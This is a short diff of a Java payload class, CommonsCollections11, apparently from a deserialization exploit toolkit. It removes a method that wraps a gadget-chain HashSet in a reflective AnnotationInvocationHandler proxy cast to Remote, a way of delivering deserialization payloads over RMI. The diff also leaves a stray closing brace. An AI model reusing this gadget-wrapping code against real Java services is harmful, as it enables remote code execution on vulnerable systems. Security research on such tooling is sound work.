@@ -70,21 +70,9 @@ public class CommonsCollections11 implements PayloadType {
 
         return hashset;
     }
-
-    @Override
-    public Remote getRemoteObject(String command) throws Exception {
-        HashSet hashset = getObject(command, false);
-        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor constructor = clazz.getDeclaredConstructors()[0];
-        constructor.setAccessible(true);
-        Map map1 = Reflections.createMap("handlerHashset", hashset);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);
-
-        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
-                Remote.class.getClassLoader(),
-                new Class[]{Remote.class}, handler));
-        return remote;
     }
 
 
-}
+
+
+
